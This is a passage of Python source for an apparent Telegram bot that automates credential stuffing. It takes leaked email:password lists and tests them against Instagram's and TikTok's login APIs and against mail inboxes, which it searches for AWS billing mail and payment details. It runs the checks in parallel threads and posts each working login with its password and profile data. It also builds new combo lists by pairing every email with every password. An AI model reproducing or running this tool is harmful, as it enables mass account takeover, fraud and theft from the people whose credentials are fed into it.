                if hits:        _al += ["═══ HOSTING HITS ═══"] + hits
                if no_inbox:    _al += ["\\n═══ LOGIN OK / NO MATCH ═══"] + no_inbox
                if bads:        _al += ["\\n═══ BAD ═══"] + bads
                if errors_list: _al += ["\\n═══ ERRORS ═══"] + errors_list
                if _al:
                    _tgt2 = user_id if _grp else _inbox_hosting_chat
                    send_large_document(_tgt2, "\\n".join(_al).encode('utf-8'),
                        f"HOSTING_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                        caption=f"🌐 <b>Hosting Results</b>\\n✅ {len(hits)} Hits | ❌ {len(bads)} Bad\\n\\n💎 {MY_SIGNATURE}")
              except Exception as e:
                try: bot.send_message(_inbox_hosting_chat, f"❌ Error: {str(e)}")
                except: pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_inbox_hosting_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── AWS INBOXEN MODE ──────────────────────────────────────────
    if doc_session.get("mode") == "inbox_aws" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"☁️ <b>AWS Inbox Scan Started!</b>\\n\\n"
                f"📥 Accounts: <b>{total}</b>\\n\\n⏳ Please wait...",
                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            hits = []; bads = []; no_inbox = []; errors_list = []
            checked = [0]; lock = threading.Lock()

            _inbox_aws_SENDERS = {'AWS': ['no-reply@signup.aws', 'aws-billing-support@amazon.com', 'noreply@billing.amazon.com', 'noreply@amazonaws.com', 'no-reply@amazonaws.com', 'notifications@email.amazonaws.com', 'aws-noreply@amazon.com', 'account-update@amazon.com', 'billing@amazon.com']}

            def _inbox_aws_check_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(_ea, _pw)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(_ea, _pw)
                    status = result.get("status", "RETRY")
                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{_ea}:{_pw}")
                        return
                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{_ea}:{_pw} | {status}")
                        return
                    _found = False; _prov_name = ""; _email_count = 0; _combined = ""; _payments = []
                    if provider == "tonline":
                        for _pn, _slist in _inbox_aws_SENDERS.items():
                            for _s in _slist:
                                _sf, _fetched = TOnlineChecker.search_and_fetch(_ea, _pw, _s, max_count=10)
                                if _sf:
                                    _found = True; _email_count += len(_fetched)
                                    if not _prov_name: _prov_name = _pn
                                    for _it in _fetched: _combined += " " + _it.get("subject","") + " " + _it.get("body","")
                    else:
                        _tk2 = result.get("token",""); _cid2 = result.get("cid","")
                        for _pn, _slist in _inbox_aws_SENDERS.items():
                            for _s in _slist:
                                _texts2 = _hotmail_search_and_fetch(_tk2, _cid2, f'from:"{_s}"', 10)
                                if _texts2:
                                    _found = True; _email_count += len(_texts2)
                                    if not _prov_name: _prov_name = _pn
                                    for _it in _texts2: _combined += " " + _it.get("subject","") + " " + _it.get("body","")
                    if _found and _combined:
                        _payments = extract_payment_from_text(_combined.lower())

                    with lock:
                        checked[0] += 1
                        if _found:
                            _pay_str = " | ".join(_payments) if _payments else "None"
                            _exp = _extract_expiry_date(_combined) if _combined else None
                            _exp_line = f"📅 Expires: <b>{_exp}</b>\\n" if _exp else ""
                            hits.append(f"{_ea}:{_pw} | AWS ✅ | {_prov_name} | Emails: {_email_count} | Payment: {_pay_str}")
                            _hnum = len(hits)
                            _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            _tgt = user_id if _is_grp else message.chat.id
                            try:
                                bot.send_message(_tgt,
                                    f"━━━━━━━━━━━━━━━━━━━━\\n"
                                    f"☁️ <b>AWS Hit #{_hnum}</b>\\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\\n\\n"
                                    f"📧 Email: <code>{_ea}</code>\\n"
                                    f"👤 Pass: <code>{_pw}</code>\\n\\n"
                                    f"☁️ <b>Provider:</b> {_prov_name}\\n"
                                    f"📨 <b>Emails found:</b> {_email_count}\\n"
                                    f"{_exp_line}"
                                    f"💳 <b>Payment:</b> {_pay_str}\\n\\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\\n"
                                    f"💎 {MY_SIGNATURE}", parse_mode='HTML')
                            except Exception: pass
                        else:
                            no_inbox.append(f"{_ea}:{_pw}")
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _inbox_aws_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"☁️ <b>AWS Check Running...</b>\\n\\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 No Match: <b>{len(no_inbox)}</b>",
                                message.chat.id, progress_msg.message_id,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except: pass
        
            _inbox_aws_chat = message.chat.id; _inbox_aws_pm = progress_msg.message_id; _inbox_aws_uname = message.from_user.username or ""

            def _inbox_aws_thread():
              try:
                threading.Thread(target=_inbox_aws_progress, daemon=True).start()
                with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
                    ex.map(_inbox_aws_check_one, combos)
                end_scan(user_id)
                try: bot.delete_message(_inbox_aws_chat, _inbox_aws_pm)
                except: pass
                cc = checked[0]
                record_inbox(user_id, username=_inbox_aws_uname, service_name="AWS", combos_count=cc, hits=len(hits), bads=len(bads))
                _grp = is_allowed_group(_inbox_aws_chat) and _inbox_aws_chat != user_id
                bot.send_message(_inbox_aws_chat,
                    f"━━━━━━━━━━━━━━━━━━━━\\n"
                    f"☁️ <b>AWS SCAN {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\\n"
                    f"━━━━━━━━━━━━━━━━━━━━\\n\\n"
                    f"📊 <b>Checked:</b> {cc}/{total}\\n"
                    f"✅ <b>Found:</b> {len(hits)}\\n"
                    f"📭 <b>Login OK, no match:</b> {len(no_inbox)}\\n"
                    f"❌ <b>Bad:</b> {len(bads)}\\n"
                    f"🔄 <b>Errors:</b> {len(errors_list)}\\n\\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _grp and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                _al = []
                if hits:        _al += ["═══ AWS HITS ═══"] + hits
                if no_inbox:    _al += ["\\n═══ LOGIN OK / NO MATCH ═══"] + no_inbox
                if bads:        _al += ["\\n═══ BAD ═══"] + bads
                if errors_list: _al += ["\\n═══ ERRORS ═══"] + errors_list
                if _al:
                    _tgt2 = user_id if _grp else _inbox_aws_chat
                    send_large_document(_tgt2, "\\n".join(_al).encode('utf-8'),
                        f"AWS_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                        caption=f"☁️ <b>AWS Results</b>\\n✅ {len(hits)} Hits | ❌ {len(bads)} Bad\\n\\n💎 {MY_SIGNATURE}")
              except Exception as e:
                try: bot.send_message(_inbox_aws_chat, f"❌ Error: {str(e)}")
                except: pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_inbox_aws_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── INSTAGRAM DIRECT CHECKER MODE ────────────────────────────
    if doc_session.get("mode") == "check_instagram_direct" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"📸 <b>Instagram Checker Started!</b>\n\n📥 Accounts: <b>{total}</b>\n\n⏳ Please wait...",
                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            hits = []; bads = []; errors_list = []; two_fa_list = []
            checked = [0]; lock = threading.Lock()

            def _igchk_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    _s = requests.Session()
                    _s.headers.update({
                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                        "Accept": "*/*",
                        "Accept-Language": "en-US,en;q=0.9",
                    })
                    _r0 = _s.get("https://www.instagram.com/", timeout=8)
                    _csrf = _s.cookies.get("csrftoken", "")
                    if not _csrf:
                        _cm = re.search(r'"csrf_token":"([^"]+)"', _r0.text)
                        _csrf = _cm.group(1) if _cm else "missing"
                    _s.headers.update({
                        "X-CSRFToken": _csrf,
                        "X-Requested-With": "XMLHttpRequest",
                        "Referer": "https://www.instagram.com/accounts/login/",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Origin": "https://www.instagram.com",
                    })
                    import time as _tm
                    _ts = int(_tm.time())
                    _enc_pw = f"#PWD_INSTAGRAM_BROWSER:0:{_ts}:{_pw}"
                    _r1 = _s.post(
                        "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
                        data={"username": _ea, "enc_password": _enc_pw, "queryParams": "{}", "optIntoOneTap": "false"},
                        timeout=8
                    )
                    _data = {}
                    try: _data = _r1.json()
                    except: pass
                    _auth = _data.get("authenticated", False)
                    _2fa  = _data.get("two_factor_required", False)
                    _chk  = _data.get("checkpoint_url","") or _data.get("lock", False)
                    _msg  = _data.get("message","").lower()

                    if _2fa:
                        with lock:
                            checked[0] += 1
                            two_fa_list.append(f"{_ea}:{_pw} | 2FA REQUIRED")
                        return
                    if _auth:
                        _uid2 = str(_data.get("userId",""))
                        _uname2 = _ea.split('@')[0]
                        _ig_info = None
                        try:
                            _ig_info = get_instagram_full_info(_uname2)
                        except: pass
                        with lock:
                            checked[0] += 1
                            if _ig_info:
                                _igu = _ig_info.get('username', _uname2)
                                _ignm = _ig_info.get('full_name','N/A') or 'N/A'
                                _igf  = _ig_info.get('followers', 0)
                                _igfg = _ig_info.get('following', 0)
                                _igp  = _ig_info.get('posts', 0)
                                _igc  = _ig_info.get('country','N/A') or 'N/A'
                                _igb  = (_ig_info.get('bio','') or '').strip() or 'N/A'
                                _igver = "✅ Yes" if _ig_info.get('is_verified') else "❌ No"
                                _igpriv = "🔒 Yes" if _ig_info.get('is_private') else "🔓 No"
                                _igpic  = _ig_info.get('profile_pic','')
                            else:
                                _igu = _uname2; _ignm = 'N/A'; _igf = 0; _igfg = 0; _igp = 0
                                _igc = 'N/A'; _igb = 'N/A'; _igver = 'N/A'; _igpriv = 'N/A'; _igpic = ''
                            hits.append(f"{_ea}:{_pw} | Instagram ✅ | @{_igu} | Followers: {_igf:,} | Posts: {_igp} | Verified: {_igver}")
                            _hnum = len(hits)
                            _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            _tgt = user_id if _is_grp else message.chat.id
                            try:
                                bot.send_message(_tgt,
                                    f"━━━━━━━━━━━━━━━━━━━━\n📸 <b>Instagram Hit #{_hnum}</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
                                    f"📧 Email: <code>{_ea}</code>\n👤 Pass: <code>{_pw}</code>\n\n"
                                    f"📸 <b>@{_igu}</b> ({_ignm})\n"
                                    f"👥 Followers: <b>{_igf:,}</b>\n👣 Following: <b>{_igfg:,}</b>\n"
                                    f"🖼️ Posts: <b>{_igp}</b>\n🌍 Country: <b>{_igc}</b>\n"
                                    f"📝 Bio: {_igb}\n✅ Verified: {_igver}\n🔒 Private: {_igpriv}\n\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                                if _igpic:
                                    try: bot.send_photo(_tgt, _igpic, caption=f"📸 @{_igu}  |  💎 {MY_SIGNATURE}")
                                    except: pass
                            except Exception: pass
                    else:
                        with lock:
                            checked[0] += 1
                            if _chk:
                                errors_list.append(f"{_ea}:{_pw} | CHECKPOINT")
                            else:
                                bads.append(f"{_ea}:{_pw}")
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _igchk_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"📸 <b>Instagram Checker Running...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b> | 🔐 2FA: <b>{len(two_fa_list)}</b> | ❌ Bad: <b>{len(bads)}</b>",
                                message.chat.id, progress_msg.message_id,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except: pass
        
            _igchk_chat = message.chat.id; _igchk_pm = progress_msg.message_id; _igchk_uname = message.from_user.username or ""

            def _igchk_thread():
              try:
                threading.Thread(target=_igchk_progress, daemon=True).start()
                with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
                    ex.map(_igchk_one, combos)
                end_scan(user_id)
                try: bot.delete_message(_igchk_chat, _igchk_pm)
                except: pass
                cc = checked[0]
                record_inbox(user_id, username=_igchk_uname, service_name="Instagram Checker", combos_count=cc, hits=len(hits), bads=len(bads))
                _grp = is_allowed_group(_igchk_chat) and _igchk_chat != user_id
                bot.send_message(_igchk_chat,
                    f"━━━━━━━━━━━━━━━━━━━━\n📸 <b>INSTAGRAM CHECK {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Checked:</b> {cc}/{total}\n✅ <b>Hits:</b> {len(hits)}\n"
                    f"🔐 <b>2FA:</b> {len(two_fa_list)}\n❌ <b>Bad:</b> {len(bads)}\n🔄 <b>Errors:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _grp and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                _al = []
                if hits:        _al += ["═══ INSTAGRAM HITS ═══"] + hits
                if two_fa_list: _al += ["\n═══ 2FA REQUIRED ═══"] + two_fa_list
                if bads:        _al += ["\n═══ BAD ═══"] + bads
                if errors_list: _al += ["\n═══ ERRORS/CHECKPOINT ═══"] + errors_list
                if _al:
                    _tgt2 = user_id if _grp else _igchk_chat
                    send_large_document(_tgt2, "\n".join(_al).encode('utf-8'),
                        f"INSTAGRAM_CHK_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                        caption=f"📸 <b>Instagram Checker Results</b>\n✅ {len(hits)} Hits | 🔐 {len(two_fa_list)} 2FA | ❌ {len(bads)} Bad\n\n💎 {MY_SIGNATURE}")
              except Exception as e:
                try: bot.send_message(_igchk_chat, f"❌ Error: {str(e)}")
                except: pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_igchk_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── TIKTOK DIRECT CHECKER MODE ────────────────────────────────
    if doc_session.get("mode") == "check_tiktok_direct" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"🎵 <b>TikTok Checker Started!</b>\n\n📥 Accounts: <b>{total}</b>\n\n⏳ Please wait...",
                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            hits = []; bads = []; errors_list = []
            checked = [0]; lock = threading.Lock()

            def _tkchk_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    _s = requests.Session()
                    _ua = "com.zhiliaoapp.musically/2022709040 (Linux; U; Android 12; en_US; Pixel 6; Build/SQ3A.220605.009.B1; Cronet/58.0.2991.0)"
                    _s.headers.update({
                        "User-Agent": _ua,
                        "Accept": "application/json",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Content-Type": "application/x-www-form-urlencoded",
                    })
                    import hashlib as _hl, time as _tm2, urllib.parse as _up
                    _ts2 = str(int(_tm2.time()))
                    _did = "".join([str(ord(c) % 10) for c in _ea[:18]]).ljust(19, "0")
                    _params = {
                        "os_api": "29", "device_type": "Pixel+6",
                        "version_name": "26.5.4", "app_name": "musical_ly",
                        "device_id": _did, "carrier_region": "US", "iid": "0",
                    }
                    _qstr = "&".join(f"{k}={v}" for k, v in _params.items())
                    _r1 = _s.post(
                        f"https://api16-normal-c-useast1a.tiktokv.com/passport/user/login/?{_qstr}",
                        data=_up.urlencode({
                            "email": _ea,
                            "password": _pw,
                            "captcha": "",
                            "account_sdk_source": "app",
                        }),
                        timeout=8
                    )
                    _data = {}
                    try: _data = _r1.json()
                    except: pass
                    _err_code = _data.get("error_code", -1)
                    _msg2 = str(_data.get("message", "")).lower()
                    _udata = _data.get("data", {})
                    _is_hit = _err_code == 0 or bool(_udata.get("session_key")) or bool(_udata.get("user_id"))
                    _is_cap = _err_code in (1105, 1159, 2046) or "captcha" in _msg2
                    _is_bad = _err_code in (1004, 1902, 2021) or "password" in _msg2 or "not exist" in _msg2

                    if _is_hit:
                        _uid3 = str(_udata.get("user_id",""))
                        _uname3 = _ea.split('@')[0]
                        tk = None
                        try:
                            tk = HotmailChecker.check_tiktok_full(_ea, _pw, "", "")
                        except: pass
                        with lock:
                            checked[0] += 1
                            if tk and tk.get("has_tiktok"):
                                _tku = tk.get("username","Unknown")
                                _tkf = tk.get("followers",0); _tkfg = tk.get("following",0)
                                _tkv = tk.get("videos",0);   _tkl = tk.get("likes",0)
                                _tkver = "✅ Yes" if tk.get("verified") else "❌ No"
                                _tkpriv = "🔒 Yes" if tk.get("private") else "🔓 No"
                                _tkc = tk.get("country","") or "N/A"
                                _tkb = (tk.get("bio","") or "").strip() or "N/A"
                                _tkcr = tk.get("created","N/A") or "N/A"
                                _tkpic = tk.get("profile_pic","")
                            else:
                                _tku = _uname3; _tkf = 0; _tkfg = 0; _tkv = 0; _tkl = 0
                                _tkver = "N/A"; _tkpriv = "N/A"; _tkc = "N/A"; _tkb = "N/A"
                                _tkcr = "N/A"; _tkpic = ""
                            hits.append(f"{_ea}:{_pw} | TikTok ✅ | @{_tku} | Followers: {_tkf:,} | Verified: {_tkver}")
                            _hnum = len(hits)
                            _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            _tgt = user_id if _is_grp else message.chat.id
                            try:
                                bot.send_message(_tgt,
                                    f"━━━━━━━━━━━━━━━━━━━━\n🎵 <b>TikTok Hit #{_hnum}</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
                                    f"📧 Email: <code>{_ea}</code>\n👤 Pass: <code>{_pw}</code>\n\n"
                                    f"🎵 <b>@{_tku}</b>\n"
                                    f"👥 Followers: <b>{_tkf:,}</b>\n👣 Following: <b>{_tkfg:,}</b>\n"
                                    f"📹 Videos: <b>{_tkv}</b>\n❤️ Likes: <b>{_tkl:,}</b>\n"
                                    f"🌍 Country: <b>{_tkc}</b>\n📝 Bio: {_tkb}\n"
                                    f"📅 Created: {_tkcr}\n✅ Verified: {_tkver}\n🔒 Private: {_tkpriv}\n\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                                if _tkpic:
                                    try: bot.send_photo(_tgt, _tkpic, caption=f"🎵 @{_tku}  |  💎 {MY_SIGNATURE}")
                                    except: pass
                            except Exception: pass
                    else:
                        with lock:
                            checked[0] += 1
                            if _is_cap:
                                errors_list.append(f"{_ea}:{_pw} | CAPTCHA")
                            else:
                                bads.append(f"{_ea}:{_pw}")
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _tkchk_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🎵 <b>TikTok Checker Running...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 🔄 Errors: <b>{len(errors_list)}</b>",
                                message.chat.id, progress_msg.message_id,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except: pass
        
            _tkchk_chat = message.chat.id; _tkchk_pm = progress_msg.message_id; _tkchk_uname = message.from_user.username or ""

            def _tkchk_thread():
              try:
                threading.Thread(target=_tkchk_progress, daemon=True).start()
                with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
                    ex.map(_tkchk_one, combos)
                end_scan(user_id)
                try: bot.delete_message(_tkchk_chat, _tkchk_pm)
                except: pass
                cc = checked[0]
                record_inbox(user_id, username=_tkchk_uname, service_name="TikTok Checker", combos_count=cc, hits=len(hits), bads=len(bads))
                _grp = is_allowed_group(_tkchk_chat) and _tkchk_chat != user_id
                bot.send_message(_tkchk_chat,
                    f"━━━━━━━━━━━━━━━━━━━━\n🎵 <b>TIKTOK CHECK {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Checked:</b> {cc}/{total}\n✅ <b>Hits:</b> {len(hits)}\n"
                    f"❌ <b>Bad:</b> {len(bads)}\n🔄 <b>Errors:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _grp and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                _al = []
                if hits:        _al += ["═══ TIKTOK HITS ═══"] + hits
                if bads:        _al += ["\n═══ BAD ═══"] + bads
                if errors_list: _al += ["\n═══ ERRORS/CAPTCHA ═══"] + errors_list
                if _al:
                    _tgt2 = user_id if _grp else _tkchk_chat
                    send_large_document(_tgt2, "\n".join(_al).encode('utf-8'),
                        f"TIKTOK_CHK_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                        caption=f"🎵 <b>TikTok Checker Results</b>\n✅ {len(hits)} Hits | ❌ {len(bads)} Bad\n\n💎 {MY_SIGNATURE}")
              except Exception as e:
                try: bot.send_message(_tkchk_chat, f"❌ Error: {str(e)}")
                except: pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_tkchk_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ────────────────────────────────────────────────────────────

    # ── COMBO GENERATOR MODE ─────────────────────────────────────
    if doc_session.get("mode") == "combo_gen":
        step = doc_session.get("step", "")
        if step == "waiting_emails":
            try:
                downloaded_file = _download_combo(message)
                if downloaded_file is None:
                    return
                raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

                emails = []
                for line in raw_lines:
                    line = line.strip()
                    if line and '@' in line and '.' in line.split('@')[-1]:
                        email_part = line.split(':')[0].strip() if ':' in line else line.strip()
                        if email_part and '@' in email_part:
                            emails.append(email_part)

                emails = list(dict.fromkeys(emails))

                if not emails:
                    bot.send_message(message.chat.id, "❌ No valid emails found.")
                    user_sessions.pop(user_id, None)
                    return

                user_sessions[user_id] = {"mode": "combo_gen", "step": "waiting_passwords", "emails": emails}
                bot.send_message(
                    message.chat.id,
                    f"✅ <b>{len(emails)} emails loaded!</b>\n\n"
                    f"🔑 <b>Step 2:</b> Now send me the <b>password list</b> (.txt)\n"
                    f"One password per line:\n"
                    f"<code>password123\nqwerty\n12345678</code>",
                    parse_mode='HTML'
                )
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
            return

        elif step == "waiting_passwords":
            try:
                downloaded_file = _download_combo(message)
                if downloaded_file is None:
                    return
                raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

                passwords = []
                for line in raw_lines:
                    line = line.strip()
                    if line:
                        passwords.append(line)

                passwords = list(dict.fromkeys(passwords))

                if not passwords:
                    bot.send_message(message.chat.id, "❌ No valid passwords found.")
                    return

                emails = doc_session.get("emails", [])
                combos = []
                for email_addr in emails:
                    for pw in passwords:
                        combos.append(f"{email_addr}:{pw}")

                total = len(combos)

                combo_data = "\n".join(combos).encode('utf-8')
                combo_filename = f"COMBOS_{len(emails)}mails_{len(passwords)}pw_{total}total.txt"
                combo_caption = (
                    f"🔀 <b>Combo Generator Results</b>\n\n"
                    f"📧 Emails: <b>{len(emails)}</b>\n"
                    f"🔑 Passwörter: <b>{len(passwords)}</b>\n"
                    f"📦 Combos erstellt: <b>{total}</b>\n\n"
                    f"💎 {MY_SIGNATURE}"
                )
                send_large_document(message.chat.id, combo_data, combo_filename, combo_caption)
                user_sessions.pop(user_id, None)
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
            return

    # ── COMBO CLEANER MODE ──────────────────────────────────────
    if user_sessions.get(user_id, {}).get("mode") == "combo_cleaner":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

            original_count = len(raw_lines)
            seen = set()
            cleaned = []
            removed_duplicates = 0
            removed_invalid = 0

            for line in raw_lines:
                line = line.strip()
                if not line:
                    removed_invalid += 1
                    continue
                if ':' not in line:
                    removed_invalid += 1
                    continue
                parts = line.split(':', 1)
                email = parts[0].strip()
                password = parts[1].strip()
                if not password:
                    removed_invalid += 1
                    continue
                # Basic email format check
                if '@' not in email or '.' not in email.split('@')[-1]:
                    removed_invalid += 1
                    continue
                # Duplicate check
                key = line.lower()
                if key in seen:
                    removed_duplicates += 1
                    continue
                seen.add(key)
                cleaned.append(f"{email}:{password}")

            cleaned_count = len(cleaned)
            result_text = "\n".join(cleaned)

            cleaner_caption = (
                f"🧹 <b>COMBO CLEANER DONE!</b>\n\n"
                f"📥 Original: <b>{original_count}</b> lines\n"
                f"✅ Clean: <b>{cleaned_count}</b> lines\n"
                f"🗑 Duplicates removed: <b>{removed_duplicates}</b>\n"
                f"❌ Invalid removed: <b>{removed_invalid}</b>\n\n"
                f"💎 {MY_SIGNATURE}"
            )
            send_large_document(message.chat.id, result_text.encode('utf-8'),
                                f"cleaned_{cleaned_count}.txt", cleaner_caption)
            user_sessions.pop(user_id, None)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error during cleanup: {str(e)}")
        return

    # ── MAIL EXTRACTOR (CHECKER) MODE ───────────────────────────
    if user_sessions.get(user_id, {}).get("mode") == "mail_extractor":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

            # Parse valid-format lines only
            combos = []
            for line in raw_lines:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                parts = line.split(':', 1)
                email = parts[0].strip()
                password = parts[1].strip()
                if not password or '@' not in email or '.' not in email.split('@')[-1]:
                    continue
                combos.append((email, password))

            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return

            progress_msg = bot.send_message(
                message.chat.id,
                f"🔍 <b>Checking {total} Accounts...</b>\n\n"
                f"⏳ Please wait...",
                parse_mode='HTML'
            )

            hits = []
            checked = [0]
            lock = threading.Lock()

            def check_one(combo):
                email, password = combo
                try:
                    result, provider = check_account_auto(email, password)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(email, password)
                    with lock:
                        checked[0] += 1
                        if result.get("status") == "HIT":
                            hits.append(f"{email}:{password}")
                except Exception as e:
                    print(f"[MailExtractor] Error checking {email}: {e}")
                    with lock:
                        checked[0] += 1

            def progress_updater():
                last = -1
                while checked[0] < total:
                    if checked[0] != last:
                        last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🔍 <b>Checking Accounts...</b>\n\n"
